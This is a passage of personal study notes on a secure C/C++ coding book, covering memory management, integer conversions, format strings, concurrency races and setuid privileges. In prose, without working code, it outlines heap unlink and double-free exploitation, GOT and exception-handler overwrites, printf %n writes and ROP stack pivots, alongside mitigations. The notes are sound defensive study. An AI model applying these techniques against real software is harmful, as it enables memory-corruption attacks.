(Is this different in newer GCC? Saw something about 4.7 it's in .init_arrray instead. Anyhow this is quite GCC / version specific? How relevant is this?)

##### longjmp (setjmp.h)

Feature in C standard (think non-local goto).
Sets base pointer, program counter directly basically from int __jmp_buf[6];

(Possibly useful e.g. for error handling ... discussed here https://stackoverflow.com/questions/14685406/practical-usage-of-setjmp-and-longjmp-in-c )

##### Overwrite exeception handler address (unclear in regular C?)

#### Mitigations -> EncodePointer (Microsoft)

Lastly EncodePointer / DecodePointer is mentioned, from Microsoft.
Bascially encrypt the pointer stored in memory, making it difficult for an attacker to (given an overflow/arbitrary memory write) write a valid address they want executed.
Not sure, can't find any mention of this outside the microsoft page right now... (https://docs.microsoft.com/en-us/previous-versions/bb432254(v=vs.85))

This might answer it: "brought into the process to avoid a kernel transition every time a pointer needed to be encoded or decoded [..] The mitigated news is that in the time since pointer encoding was introduced, there have been a lot of changes which mitigate the security impact. For example, address space layout randomization (ASLR) makes it harder to predict where that last piece of information went. And control flow guard (CFG) makes it harder to get control to jump through a function pointer to an address of your choosing." - [Microsoft-EncodePointer]


## Dynamic Memory Management (Chap. 4)

**Comment**, [c-in-kernel] discusses C in the kernel. For instance, auto initiate all local variables to zero (gcc -finit-local-vars, Clang -fsanitize=init-local), 

(alignment pp. 147-149 ... alignas(max_align_t) to reqeust alignment suitable for any type on the platform... aligned_alloc() ...)

alloca() "allocates memory in the stack frame of the caller" - (This memory is automatically freed!) might be risky if we allocate too much and blow the stack?
I thought alloca was convenient but its use is discouraged [citation needed] in favor of dynamic arrays (risk of stack overflow? platform dependent?) ?

For performance reasons, memory is usually not initialized in C (malloc, ..). And remember that reading uninitilized memory can leak secret data!
-> Overwrite sensitive data before calling free() this is done with memset_s.
	Unfortunately regular memset can be removed in optimizations by the compiler (!) if data not used, memset_s will work however.

Since memory can get full (-> heap exhaustion) we want to check return values when possible. It's better to see that malloc fails instead of getting null deref error, or worse.
e.g. if we dereference the null pointer plus an attacker controlled offset ("NULL+atkr_offset") we can get a arbitrary memory write which could be leverage for attack -> worst case arbitrary code execution (example from book) ... especially if attacker themselves can force malloc to fail with a too large number.

### Main problems (Chap. 4.2)

	- Neither malloc or free will initialize/zero memory, this needs to be done manually with memset_s if data needs to be known after init or to overwrite sensitive data before free.
	  also the pointer will not be set to NULL, using this memory is undefined ... might want to NULL it.

	- Used freed data is undefined but usually reads old data ... writing to this memory _can_ cause problems (could be shared if malloced else where e.g. or corrupting memory manager structures)

	- Double free can mess up the memory manager ... unknown consequences? "exploitable vulnerability".

	- Null dereference is _generally_ (undefined behavior) not that bad (segmentation fault), however on certain platforms/implementations,
	  0 may be valid adr which could overwrite important data or structures (example in book is that exception vector starts at address zero, enabling arbitrary code execution).
	  Another case is if we have a null address plus an offset which we dereference *(null_ptr+offset), we might any way end up in valid memory which could be used in an attack.

	- Memory leaks can obviously result in denial of service (some times).

So ->
	remember to init or overwrite memory if needed (memset_s).
	check return value of malloc, erroring out is better than having undefined behavior.
	set pointer to NULL after free, to avoid reusing freed ptr, (if needed).
	(_in most environments_, data is freed when the process exits, for leaks we are more concerned about reoccuring allocations which could cause heap exhaustion.
		this said, it's best practise to free everything we allocate)

They discuss realloc and why it can be tricky. It frees previous memory and allocates new, but if it fails it should do _neither_ ... basically can cause problems if we call it with size zero which should not be done.
Remember errno (_POSIX only_), "is set by system calls and some library functions" (from man page). Can be useful to check to see whether a called failed, and why (they use it with realloc .. POSIX only but could maybe have some wrappers for cross-plaform). (might want to set errno=0 before the call)


### C++ (Chap. 4.3, 4.4)

__(just skimming..)__

Garbage collector "possible" in C/C++ (replace current memory manager, and can also be used for leak detection only) but "disguisted pointers" (e.g. doing pointer arithmetic, the pointer can be modified and then restored at a later point - regardless where this is can we be sure it is still usable). Therefore, C++11 introduced _safely derived_ pointer. (pg. 170)
	Unclear if this is actually used in C++? The main benefits in this area, as compared to C, instead seem come from RAII (Resource Acquisition Is Initialization) and smart pointers ... which in some cases results in the same thing? i.e. different lifetime management and "automatic" de-/allocations.
Exception handling is possible in C++ (looks very much like Java's at a glance, imo).


## Memory Manager / Allocator (Chap. 4.5-4.7)

### What is a memory manager (incl. malloc, free, etc.) and what can go wrong?

The memory manager (malloc, free, ..) is simply a C program which maintains a list of available blocks and their size (stored on the heap!),
and support these basic operations to manage memory addresses.
If larger chunks are needed, it calls brk or mmap to request more memory from the kernel.
You can write your own malloc implementation if you want (NO DON'T DO IT! ;) )

Malloc/free is usually provided by libc

#### More

So libc malloc ... can be replaced with anything you'd want, really it's not rocket science!

"The glibc malloc is derived from ptmalloc (pthreads malloc), which is derived from dlmalloc (Doug Lea malloc)"
- [glibc-malloc]

Double link list of chunks with free and used memory

Basic idea seems to be simple, although careful with fragmentation.

Each memory "block" (struct) contain some metadata (size, next, previous) and can be in different two states: either free or in use by the application.

#### From Linux book chap. 7

By the way, malloc itself is not a system call although it can in turn call brk (~increase size of data segment for process) or mmap (~get new separate memory area). (see _man 3 malloc_)

Remember we want to minimize syscalls and the memory manager anyway is not running in kernel-mode, although it may as mentioned need to make certain syscalls such as to call brk to increase memory available to it and thus the process.

### Summary of Exploits

We have double-linked list.
Also if a chunk is freed, the same area as the user normally would access (when in-use) is instead pointing to next chunk (forward ptr) and previous chunk (backward ptr) .. (the rest is unused space).
(these ptrs are not in used chunks? I guess they are stored somewhere else? Or not necessary since we in C let the user manually free the heap chunks .. or if process exits full memory is set as free regardless).
They mostly mention unlink based exploits that should be mitigated nowadays, so idk?

Note that still, much of the work involves how to run the target shellcode. And made harder with mitigations ASLR, NX, etc. ..?
Their examples include overwriting the GOT entry for a function that is run or finding and overwriting exception handler (p. 204 Windows).
Still, doesn't execution here end up in our shellcode on the heap, even if it goes via these "trampolines"?
Sure we can (potentially) change strcpy (GOT), exceptions (exception handler), or return (stack, pg. 202) to point to our address (remember this is all just essentially _write address to arbitrary memory_), but where is our _executable_ payload... on heap?

From what I read we have three basic scenarios (exploits), roughly;

    | heap overflow |     |                 |
    |      OR       |     |                 |
    | free + free   |  +  | allocate memory |
    |      OR       |     |                 |
    | free + write  |     |                 |


I) overflow to overwrite metadata of chunk. If an unlink is then performed, to combine two or more free blocks, it writes "forward ptr's back ptr = arbitrary address" -> arbitrary execution. (fp->BP = bp, both ptrs controlled by attacker)

But this (unlink) should genereally be patched in later versions of memory managers.
Also, that you could control a single (small, one address) write to any address might sound good but still not trivial to exploit... (1. do we know where to write, 2. and then what to write e.g. (if this changes execution flow) where do we then want to jump? )
ASLR? Not executable heap? etc. I assume makes this harder. And we dont have the ROP gadget situation as in stack overflow that we as easily can make multiple small jumps?
They don't mention this here in the book (I'm looking at pg 203), but still state how hard this is without triggering a fault.
They then go on to suggest an alternative approach by "overwrite the address of an exception handler" done by finding and executing "SetUnhandledExceptionFilter".
A "trampoline" (shellcode is hit by going via exception handler, beneficial since shellcode location not known ahead of time).
This specific exploit would not work with ASLR, as I can see, considering they look for the location of this function to execute by analyzing the binary (either statically or dynamically linked).

II) double free. First of all, could corrupt the memory manager so any subsequent allocation (of same size) would yield the same chunk (and address), buggy!
This should be "patched" but: they do free+free+malloc+write+malloc (last malloc makes the unlink macro to run).
At least, no overflow is needed. Double free, then malloc and write to the area that the memory manager considers still be free is then interpreted as FD and BK ptrs by (it and) unlink.

For Windows they use a similar "unlink" exploit here, where they are able to overwrite the forward and backward ptrs in FreeList[0] (by pushing it into the double-freed memory which the user can still write - pg. 211).

(I didn't understand this/the structure 100%, but the idea is simple as above ... they mention cache and regular bins etc.?
	also might taking some getting use to looking at and formating shellcode for execution like this...)

III) Writing to free would work the same way as double free by unlink exploit. (free+write+malloc -> unlink exploit)

### Mitigations

Set ptrs to NULL after free (what if multiple references exist to the same object..).
Comment: Maybe this is a bad idea but why isn't free() a macro to set ptr to NULL and freeing as well?

Comment: Remember... as always is not as easy to just run valgrind and magically find all memory leaks, as this depends on code coverage. Write tests! No magical solution of course.
It's also possible to change memory management functions. The book mentions phkmalloc which has some possiblity to see if a pointer is valid and also allocated/freed (e.g. used in Openbsd), and otherwise fault and terminate the application.
Otherwise it's possible to replace malloc with a debug version to find memory issues during testing, but run stock malloc during regular runtime.

Idea: Can't we have a VIM plugin that shows what memory a function call will alloc on heap (e.g.), this should be possible??

They mention randomization malloc (like in OpenBSD), so each time a non-deterministc address is given (given by either OS or chunk from memory manager).
Comment: They don't mention ASLR here, but ASLR offsets the whole heap (AFAIK) but randomizations for each heap chunk gives another protection for heap attacks as discussed here? While ASLR only gives protection in that it's harder to find a gadget or shellcode to execute if exploit succeeds that far?
They mention jemalloc memory manager from FreeBSD, which doesn't use unlinking for instance to avoid expliots. They stress that since modern systems use ASLR, NX it can be easier to overwrite sensitive heap data and that way acheive something, than to try to leverage arbitrary memory write.

Static (any good tools for C?? Maybe not trivial since platform specific, undefined behavior, hardware, ... easier with other langs?) and dynamic analysis (extensive test suite + Valgrind is very useful) can be done

For more reading about some mitigations see OpenBSD security features (ProPolice GCC extension, phkmalloc, W^X (NX bit on x86), to mention some regarding memory protection).
For more on dynamic analysis see available tools by Valgrind test suite https://www.valgrind.org/info/tools.html (the usual memcheck, but also tools for cache profiler, heap profiler, thread debugger)

NX / W^X is really nice but issues with some applications ... JIT, trampolines,... Usually implemented as NX bit in memory mapper.
By reading _cat /proc/$PID/maps_ we can see which, if any, memory areas are writable and executable (TODO!) [linux-proc].

### Comment / Unrelated

application.o -> [free(), malloc(), ..] -> libc.so -> [syscalls: sbrk, ..] -> kernel
As far as I understand, glibc provides memory manager and also via it we can use glibc kernel interface. This is built into application as a regular library no problem.
The application could also use own implementations, perform syscalls directly and so on.

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#### Old / previous explanation (can remove?)

##### Unlink

So with a heap buffer overflow we mess up the memory manager.

They mention _unlink_, where by leveraging a buffer overflow we can fool the memory manager during unlink procedure.
That is, when it consolidates two chunks (two unused chunks should me merged to one larger) it changes the next chunks "back pointer" to point to the previous block.
Both the forward pointer and back pointer we control, so we have an arbitrary memory write: fp->BP = bp.

This is all good, but in the book they overwrite the GOT entry (assumes writable GOT) for free() to instead point to our shellcode. But why would the heap be executable? And it's not really a ROP situation either with a single jump?

TODO -> hm regarding heap spray and ROP read this: https://dl.packetstormsecurity.net/papers/general/rop-deepdive.pdf
	Basically we can make a ROP situation if we control ESP and thereby we can "move the stack to our heap"? (xchg EAX, ESP && retn)

Naturally, an arbitrary memory write can be quite powerful. Then of course this can be made harder to exploit with basic precautions such as GOT is not writable, non-executable heap ... and more complex like control-flow protection


##### Unlink 2 - double free

Similar exploit can be done in double free siutation, although not very likely. The book mentions this is really patched now so not really current?
Still double free might leave a chunk forever as "free" and consequent mallocs of similar size will all get the same address ... shared memory ... big problems in general.

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


## Integer Conversions (Chap. 5)

### Negative Integers

_Usually_ two-complement is used for signed integers in modern systems (as oppose to one-complement, or simple uhm.. e.g. 42 = -42 with high bit = 1), still highest bit denotes if negative (stands for large neg number).
This is done since that way it's easier to do arithmetic [citation needed]. Two-complement example: int 1 = 0001, int -1 = (~0001+1 = 1110+1) = 1111. High bit then stands for -2^(4-1) = -2^3 = -8 => so e.g. 1111 = (-8) + 4 + 2 + 1 = -1, (1110 = -2, etc.)

Signed integer overflow is undefined (although usually wraps max positive to max negative).

### Some Integer Types

NOTE!: char can be either unsigned or signed in implementation (not standardized!). It is recommended to use signed / unsigned char is used for numeric values! (and more? Example from book is they print a char as %d... when it could also be unsigned causing misleading read out) (pg. 240).

pp. 242-245: size_t, ptrdiff_t, intmax_t/uintmax_t, intptr_t/uintptr_t, plattform in-/-dependent integer types.

independed such as int8_t, uint8_t, but also int_least8_t (at least 8 bits wide) and int_fast8_t ..

Comment: Interesting... so we have a fast type (from stackoverflow ~ it's a type of at least X bits which is the best from a performance point-of-view.)
	 I guess this could be that a 32bit value could be used instead of 16 or 8 if faster, I think this can often be the case (i.e. faster) actually (downside more memory used of course).
	 This might be reasonable, from The Rust Programming Language book 32 bit is the standard integer size since they claim that's often the fastest on modern 32 or 64 bit systems. [Rust-faster]

[Rust-faster] - ISBN 978-1-7185-0044-0, The Rust Programming Language (Covers Rust 2018), pg 38


### Integer Promotion

Addendum: Variables of different or _the same_ sizes are promoted to int in arithmetic (or unsigned int if they didn't fit in int),
            but if any type is bigger than int, the larger is used. From C in a Nutshell 2nd ed, see also C standard.¹
                (I assume that int is default since using the processor's word size is faster, e.g. on x86_32 32 bit is much
                faster than 16 bit arithmetic [citation needed]. Although int is still 32-bit on a modern x86_64 though?
                (I'm just writing this comment quickly, tell me if "word" is not the correct term here))
            You can use unary +, to manually promote a variable e.g. +my_var.

          In other words from Stackoverflow:
              "When applying an arithmetic operator,
               each of its operands is first promoted to int if its rank is less than int (such as char or short).
               If one of those operands then has a higher rank still (such as long), than the smaller is promoted."
               https://stackoverflow.com/a/44056062

Types have ranks, so long int is greater than int etc (more on pg. 247).
In an expression (the "usual arithmetic conversions" such as * / % + - < > <= == & ^) to a higher rank, the lesser can be promoted, such as;
```
    unsigned char a = UCHAR_MAX;
    unsigned int  b = UCHAR_MAX;
    unsigned int  c = a*b;
```

Note: int c = a*b, is the same as c = (int) (a*b); [citation needed], thus is a and b are shorter than int, data can be lost
To be sure with a larger type on the left side, cast the first one (left-to-right) to target size:
```
    char a = CHAR_MAX,
         b = CHAR_MAX;
    int  c = (int) a*b; // a, b are promoted to int to avoid potential overflow during calculation
//on the other hand, this wouldn't work, left-to-right evaluation, res = a*b*(int) c*d;

//Example of bug
    unsigned x = INT_MAX;
    unsigned y = INT_MAX;
    unsigned long z = 255;
    unsigned long r1 = x * y * z;  // = 255
    unsigned long r2 = z * x * y;  // = 13835056960065503487
    printf("xyz=%lu, zxy=%lu\n\n\n",r1,r2);
```

Note: as mentioned in the book (pg 248). Promotions could give surprising results if we want to do very specific or bit-level operations and the variable is promoted, such as:
```
    unsigned char us = UCHAR_MAX; // = 0xFF
    int            i = ~uc;       // = 0xFFFFFF00 (Maybe we expected 0x00000000 here)
```

The book does not say too much on this. But consider also potential overflows in more complex expressions:
```
    signed char c1,c2,c3;
    int res = c1 * c2 / c3
```

Reading left to right, c1*c2 will be calculated before division by c3. Thus a potential overflow could happen in (int) c1*c2 depending on their types.
However, in this example, signed char is shorther than int so they will be promoted, luckily (char*char) is smaller than int so no overflow is possible (2^(8+8) <= INT_MAX).
But in another case, such as if c1,c2,c3 were int above, ((int*int)/int) could indeed overflow as these variables do not need be promoted.
```
    Instead, we could choose to cast the left-most variable to a larger type which we know will fit the calculation:
        int32_t c1,c2,c3;
        int32_t sum = ((int64_t) c1) * c2 / c3
    The result would then after the division be truncated (both are signed types) to 32 bit once again (which is undefined behavior if the value does not fit but.. :) ),
    however if the divisor c3 is large enough we can be sure that no trunctation will be made.
```

This reminds me of the ALU (Arithmetic Logic Unit) in the CPU. But maybe confusing to think in hardware here? e.g. 32 bit could be the usual most fast register + ALU input size?

¹   C standard, section 6.3.1:
```
 "The following may be used in an expression wherever an int or unsigned int may be used:
- An object or expression with an integer type (other than int or unsigned int) whose integer conversion rank is less than or equal to the rank of int and unsigned int.
- A bit-field of type _Bool, int, signed int, or unsigned int.
- If an int can represent all values of the original type (as restricted by the width, for a bit-field), the value is converted to an int; otherwise, it is converted to an unsigned int.
  These are called the integer promotions. All other types are unchanged by the integer promotions."
section 6.3.1.8:
 "If both operands have the same type, then no further conversion is needed.
 - Otherwise, if both operands have signed integer types or both have unsigned integer types,
    the operand with the type of lesser integer conversion rank is converted to the type of the operand with greater rank.
 - Otherwise, if the operand that has unsigned integer type has rank greater or equal to the rank of the type of the other operand,
    then the operand with signed integer type is converted to the type of the operand with unsigned integer type.
 - Otherwise, if the type of the operand with signed integer type can represent all of the values of the type of the operand with unsigned integer type,
    then the operand with unsigned integer type is converted to the type of the operand with signed integer type.
 - Otherwise, both operands are converted to the unsigned integer type corresponding to the type of the operand with signed integer type."
from: http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf
```

### Conversions

Other source: pp. 55-57 in "C in a Nutshell, 2nd edition".

Added comment: To see what behavior is "undefined" (i.e. implementation defined) and how it is actually handled by the compiler, see the compiler manual. Such as https://gcc.gnu.org/onlinedocs/gcc.pdf, chapter "C Implementation-Defined Behavior"

tl;dr: implicit conversions can happen in C (use -Wconversion in gcc to enable warnings!).
        This is fine, but the programmer should check if the value converted cannot be represented in the destination type (too big or too small/negative).
        Add manual checks / safe conversions for this. And in general try to avoid changing to smaller types and between signed and unsigned types.

        Also, implicit casts can be problematic: a=b, then later b=a ... in the end the new value of b can be completely different if one is signed and one is unsigned (pg. 260).
                                            ... even more so since certain conversions are implementation specific.

Question: Is it not the case that all this is "well-defined" but depending on hw. Most hw use two-complement.
            as seen on pp. 252-255 these all seem to be defined on the x86-32 platform.

tl;dr 2:
      Everything seem to be as you'd expect. Note that the book on these pages specifically look at x86_32,
       but I think this only changes how the data is interpreted, specifically two-complement for negative numbers.
        
      Note 1: Unsigned holds larger values than signed (of course, since it does not use high order bit for sign).
              And signed can hold negative values. The tl;dr is to watch out for these two dangerous cases.
      Note 2: Usually two-complement is used, which makes negative numbers as binary e.g. -1 = 0b1111 1111, -128 = 0b1000 0000
                It seems like the bit pattern is maintained as much as possible in these conversions.


        signed to unsigned:   positive nr: well defined (might lose data; the low bit pattern is preserved).
                              negative nr: (UNDEFINED) we preserve bit pattern, so (for x86) in decimal it will be interpreted as a positive integer ("undefined" .. hardware specific)
                                            (for two-complement -1 would yield the largest positive value).
        unsigned to signed:   if it fits: fine (otherwise we could "fix" this by: int a = (a_unsigned & INT_MAX);
                                                or check if a_unsigned > INT_MAX ... )
                              if too big:    (UNDEFINED) the bits are preserved, resulting in a negative number on x86 (per definition if it is too big; it will be negative). ("undefined" .. hardware specific)
        unsigned to unsigned: always ok! if destination is smaller data is simply lost.
        signed to signed:     if it fits:  OK!
                              if too big: (UNDEFINED), usually truncate (result could be either positive or negative)

Comment on number manipulation: the bit pattern is tried to be maintained and negative numbers are most often represented as two-complement.
                    As such, it _cannot_ be converted naively like unsigned int a = (a_signed & UINT_MAX); //remove sign bit
                    (If the number was negative we would only get its reverse more or less, like:
                     -2 = 0b 1111 1110 =>
                    126 = 0b 0111 1110 )
                    I mean all this is kind of weird (hardware and implementation specific), need to know what you're doing.
                    But for conversion like this we have abs() functions, as manual bit manipulations might be hw specific as above.

Also: signed overflow is _not_ well defined.
      unsigned overflow _is_ well defined.

OLD stuff, not really necessary to repeat:
        unsigned to lower rank unsigned (loss of precision): simple remove any bits not fitting, i.e. keep bit-pattern. Well defined behavior.
        
        unsigned to signed of same size: "_implementation defined result or implementation defined signal is raised_", but often 127=127, 128=-1, 129=-2, etc. and vice versa.
        
        See table on pg. 252 over conversion _from_ unsigned integers.
        But tl;dr, from unsigned, basically try to maintain bit pattern and throw away what doesn't fit. Note, this can then yield a large negative number if converting to signed.
        
        Comment: I was initially suprised that casting a large positive number could yield a negative number (and that it's not well-defined as the opposite). But I guess that being a low-level language, C (the compiler) does much to maintain the bit pattern and not do any "magic".
                And I guess the situation is as problematic anyway for the user.
                NOTE: then on the other hand, when possible the value is maintained and not the bit pattern. For instance, -127 as signed char vs -127 signed int has different bit pattern (i.e. the new bits are not only zeroes) due to two-compliment.
        
        signed to lower rank signed (loss of precision): "_implementation defined result or implementation defined signal is raised_" .. most commonly just truncate to fit the smaller size, so the result may therefore be positive or negative.
        
        signed to unsigned:  (should be fine as long as it's not negative) pg. 254


See tables for overview on conversion, pages 252 & 255.



#### Test condition

On these pages, pp. 263-283, different conditions to check whether an overflow occured in (+,-,*,/,%,>>, unary -).
So that might be interesting for those cases, otherwise it's too long to repeat here.
It's all about checking for overflows while not relying on undefined behavior.

One thing here is that we can't let a signed value overflow in our checks.
Also they mention edge case that -INT_MAX/-1 = cannot fit with two-complement (where -INT_MAX can fit, but +INT_MAX cannot fit in 32-bit integer).

#### pp. 283-288, shows of how this can be exploited
Basically, issues with wrap around and integer conversions, especially with malloc (malloc(0), or e.g. malloc(-1) will give something very large due to implicit conversion).
a[i] //if i is negative, an _earlier_ address is used .. outside the array (pg. 288)

#### pp. 288-304 Discusses mitigation
Usually it's not a big problem to convert between types - check if negative or if too big.
But this gets complicated when we're adding or multiplying (pg. 296, "precondition and postcondition testing)
Adding unsigned ints they just check if (UINT_MAX - ui1 < ui2) { error }
For (signed) multiplication it's much more complicated, their example requires 25 lines and 4 if statements.

Regardless of these specifics, the thing to remember is that naive checks will be ignored by compiler, such as:
int i = 0;
while (i < INT_MAX) {i++; do_stuff();}
/* per definition i cannot be larger than INT_MAX,
    useless check, will be ignored completely :)
    In this case this means an infinite loop! */


### On undefined behavior (not directly connected with this chapter)

Avoid undefined behavior: (including but not limited to) signed overflows, dangerous casts (mainly which causes signed overflows?), bit shifting by negative or by more bits than the integer is wide.
The problem is that since this behavior is undefined the compiler can take liberties to improve performance, which might case unexpected and not always the same behavior.

    "If any step in a program’s execution has undefined behavior, then the entire execution is without meaning.
    This is important: it’s not that evaluating (1<<32) has an unpredictable result, but rather that the entire execution of a program that evaluates this expression is meaningless."
    [C-undefined-regehr]

So the undefined operation could be ignored (a no-op), otherwise optimized (e.g. looping over a signed integer could be assumed to not overflow, as this is indeed undefined behavior), or reordered.
Naturally, a function could also get input that only sometimes result in undefined behavior, in which case the otherwise well-behaving function could do "whatever". [C-undefined-regehr]


    "
    Boolean operators like <= always return 0 or 1.
    The code
    
    	printf("%d", j++ <= j);
    
    can print 42, or "forty-two".
    If you can hold these two thoughts simultaneously, you will have achieved Enlightenment.
    " - https://www.eskimo.com/~scs/readings/undef.950311.html)


    "Signed integer overflow is more problematic because it is undefined behavior and may result in a trap (for example, a division error on x86-32)"
    - pg. 294


#### Undefined Behavior

All this, for what? The idea is this, don't do undefined stuff (especially if you rely on this behavior and want to be platform independent).
In C we enjoy undefined behavior to reach better performance (mainly). This allows the compiler to do what is fastest on the specific platform as well as larger room for different choices speed/memory and other options.
For instance, certain behavior such as different ways for the CPU to represent negative numbers would add overhead if it was defined that signed integer operations shall act "like two-complement", when the systen really is not (also an effect of legacy, since behavior like this might be consistent across modern systems)
-> more here [C-undefined-llvm]

As mentioned in these articles, overflow check like _ if (size > size+1) _ can be optimized out by the compiler (_signed_ integer overflow is undefined so we can optimize that size+1 is always bigger than size),
instead an allowed fix would be to check _size == INT_MAX_. Unsigned integer overflow is well defined.

    "For example, accidentally leaving out the "i = 0" in the "zero_array" example from the first article allows the compiler to completely discard the loop (compiling zero_array into "return;") because it is a use of an uninitialized variable."
    "if you suspect something weird is going on like this, try building at -O0, where the compiler is much less likely to be doing any optimizations at all."
    [C-undefined-llvm] http://blog.llvm.org/2011/05/what-every-c-programmer-should-know_14.html

#### Tools for detecting undefined behavior

There is no good way of finding undefined behavior in a code base, they mention some tools [C-undefined-llvm];

valgrind is good but will not find C specific stuff. Also it only analyzes the binary, so depends on the optimizations made by the compiler.

clang -fcatch-undefined-behavior and -ftrapv to catch undefined behavior.. see also -fwrapv and -fstrict-aliasing -Wstrict-aliasing=2 [strict-aliasing]
"Clang has an experimental -fcatch-undefined-behavior mode that inserts runtime checks to find violations like shift amounts out of range, some simple array out of range errors, etc. [..] Clang also fully supports the -ftrapv flag which causes signed integer overflow bugs to trap at runtime" (of course slow during runtime)

Static analyzers, e.g. The Clang Static Analyzer

Try to test all possible code path:  LLVM "Klee" Subproject (http://klee.llvm.org/)


Question: Should you use memcpy instead of dangerous casts, if you want bitpattern maintained? Another alternative is have them together in a union.

[strict-aliasing] - https://cellperformance.beyond3d.com/articles/2006/06/understanding-strict-aliasing.html

### Ordering

(unrelated to previous section on undefined behavior)

    tl;dr The compiler may reorder operations granted they are not deemed depended on each other and do not have side effects.
    	However, certain operations might fault, crashing the application, and this is not considered a side effect.
    	This might cause unexpected behavior, in these faulting situations.

Reordering might be problematic in the case that an operation causes a fault, whereby no other operations can be executed thereafter.
One example would be setting an external value, and then executing an operation that could fault ... thus there's a chance that the external value might not be set.
Similarily, if we printf before the faulting line it could be that the fault is executed first and thus the print is not performed - a risk with "printf debugging".

The article also mentions that a simple "compiler barrier" (inline assembly which may touch memory) did not work.
[part 3, C-undefined-regehr]


## Formatted Output (Chap. 6) (pp. 309-351)

__tl;dr__ stack (and other) exploits using printf and strcat. Arbitrary read and writes.


printf(var); is deprecated and vulnerable

printf with %n writes data and possible to exploit (pg. 326)

Cannot trust argv[0] as it is easily set in exec call.

Use C11 _s secure functions such as sprintf_s. These often have the same prototypes as non_s version but additionally
they will error if, e.g., certain inputs are null pointers or if %n in a format string, ...  (pp. 340-341),
still these checks can also be enabled (to some degree?) by compiler such as GCC -Wformat (pg. 343).

Variadic functions can be dangerous as they can take any number of arguments of arbitrary data, see pg 344.

Use security features such as ASLR / execshield to protect against stack and other arbitrary write+execution attacks.

Taint analysis could be interesting, i.e. mark user input as tainted and see where it can end up, and e.g. 
if user input can be interpreted as format string. (pg. 343)

### TODO (skipped for now)

on arbitrary reads pp. 322 - 325

full exploit example pp. 325-331

[Only skimmed through pages 322-331]


## Concurrency (Chap. 7)

### Recommended Reading (TODO)

What the book presented was mostly an introduction to threading primitives, not too exciting, for more reading see the
two other books I reference;

**pthreads and UNIX**: chapters 29-33 (pp. 617-698)  [The Linux Programming Interface, 978-1593272203, Michael Kerrisk, 2010]

(or alternatively **C11 threads**: chapter 14 (pp. 239-259) [C in a Nutshell 2e, 978-1491904756, Peter Prinz & Tony Crawford, 2016])

Although these books do not focus on security, for that maybe look more into exploits and TOCTTOU / TOATTOU / TORTTOU / ...

### OK, Back to the Book

Task parallelism (same data but different tasks simultaneously) vs data parallelism (same task).
Amdahl's law, regarding theoretical speedup for parallel execution.
Concurrency can be both interleaved and parallel.

Volatile gives minor guarantees: that the value is consistantly read, and that read/writes to _that_ address will not
be reorder. However in terms of multithreading it is useless, as other blocks of data may still be reordered (pp. 367-368).
Instead we will use real multithreading features, such as POSIX pthreads.

Chapter goes through regular concurrency primitives and potential issues (available in C with pthreads).
However, many examples are in C++.
Concurrency stuff; __Mutexes__ (functions mtx\_lock, mtx\_trylock, ...), (lock guards), or use __atomic operations__
(atomic\_flag data type, see stdatomic.h, ... test\_and\_set, atomic\_compare\_exchange\_weak, atomic\_fetch\_add), 
__Fences__ (prevent reordering, atomic\_thread\_fence), __Semaphores__, 
Can also avoid locks all together with atomic operations and/or __immutable or thread-local data__, or by using __message passing__
instead of shared data altogheter.

Avoiding locks all together is mentioned as difficult, with __ABA problem__ as example (C example pp. 393-397).
Namely, with the incorrect assumption that if a thread reads a value twice, and if the value is the same nothing has changed..
while in reality some data could have been changed by another thread. For instance, 
a linked-list with first element A is read by T1, then T2 acts, removes A and adds a new element B.
It would not be unlikely that B has the same address as A had, and so when T1 once again wakes up it sees that the
element looks to not have changed (address of A == B) but in reality the memory is different.
The book mentions one possible solution (pg. 397), in which a separate data structure maintains all dirty addresses.
... something like this.

```
Thread-safe = being able to run concurrently.
Reentrant = thread-safe AND allowed to be interrupted and reenter function again (i.e. more strict than thread-safe)
=> thread-safe ⊆  reentrant
```

It mentions __system call interposition__ (i.e. system call wrappers to add additional checks before performing syscalls) and that they can have concurrency vulnerabilities.
Three kinds of vulnerabilities are mentioned, time-of-check-to-time-of-use (__TOCTTOU__) and time-of-audit-to-time-of-use (__TOATTOU__) and time-of-replacement-to-time-of-use (__TORTTOU__).
A similar, if not identical, article is available on lwn.net: _"Exploiting races in system call wrappers", 2007, https://lwn.net/Articles/245630/_

As I understand, C11 includes some parts of pthreads, but usually developers just use pthreads directly [citation needed].

## File I/O (Chap. 8)

Many different file systems (FS). File I/O functions (<stdio.h>) can differ depending on OS, FS, compiler, ..

Data streams (from pg. 408), e.g. stdin stdout stderr.

fopen to open a file (pg. 409 for flags). C11 added 'x', meaning create a new file with exclusive (/nonshared) access if supported. \
There are also POSIX specific alternatives (open(), close()). open() creates an open file descriptor to a file, and returns int whereas fopen() returns a FILE*.

pg. 412 for C++ file I/O.

File permisson vs. Access Control List (ACL) for access control... (briefly mentioned on pg. 413)

### File and Process Privileges

They mention inodes, special files (directories, soft or hard symbolic links, names pipes, sockets, device files, block devices) (pp. 405-407).
Additionally, UNIX file permissions, user/group IDs, sticky bit (i.e. restriction deletion flag, on directories incl. their contents to only owner and root), ("s-bit") set-user/group-ID (affects real user/group ID, effective user/group ID) (pp. 414-415).

#### Process privileges
Process privileges (pp. 415-417), has effective/real user/group ID (according to the executable permissions/flags just mentioned).
Fork and exec inherit these (RUID, RGID, EUID, EGID). Thus, (example from pg. 416) if a user with ID 25 executes a normal file, the process will have all these IDs =25, if the process then runs exec() on another file say with owner 18, the process remains IDs 25 (i.e. it inherits).
On the other hand, if the file has the s-bit set (set-user-ID) in the same scenario, the process would after the exec() call have EUID=18 and be treated with the permissions of user 18 (and not 25). It is possible for the executable to change back EUID by calling seteuid() (specifically: an *"unprivileged user processes may only set the effective user ID to the real user ID"* - Linux man page) during execution. Or reversely, to permanently drop privileges by setting EUID=RUID so that further calls to exec() will not be called with the elavated privileges.

In addition to seteuid(), they also recommend using setresuid(). setresuid()¹ always sets all three UIDs (or none on error) (pg. 421).
Finally, there is setuid() but it is more complex and should apparently not be used (pg. 420).

*"Setuid programs carry significant risk [..] What makes setuid programs particularly dangerious is that they are run by the user and operate in enviornments where the user [..] controls file descriptors, arguments, environment variables, current working directory, resource limits, timers, and signals."* (pg.423)

Perform privileged operations early and drop them permanently. When dropping privileges it is critical to check return value, in case they would fail!

Examples of dropping / regaining privileges pp. 424-426.

¹ *"setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process. \
An unprivileged process may change its real UID, effective UID, and saved set-user-ID,
